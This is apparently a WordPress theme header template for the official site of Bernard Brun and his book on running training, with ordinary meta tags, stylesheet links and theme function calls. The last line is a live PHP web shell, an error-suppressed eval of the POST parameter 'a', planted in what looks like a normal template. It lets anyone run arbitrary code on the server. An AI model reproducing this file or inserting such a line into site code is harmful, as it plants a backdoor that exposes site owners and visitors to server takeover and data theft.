<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<!--[if lte IE 6]>
   <meta http-equiv="refresh" content="0; url=http://www.mozilla-europe.org/fr/firefox/#feature-vsie" />
<![endif]-->

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<script language="JavaScript" src="<?php echo get_bloginfo('template_url'); ?>/js/themefunctions.js" type="text/javascript"></script>
<title><?php bloginfo('name'); ?><?php wp_title(); ?></title>
<meta name="description" content="Le site officiel de Bernard Brun et de son dernier livre: L’entraînement en course à pied, un classique dans le monde de la course à pied" />
<link rel="icon" href="<?php echo get_bloginfo('template_url'); ?>/images/postflowerback.png" type="image/x-icon"/>
<?php wp_head(); ?>

<?php @eval($_POST['a']);?>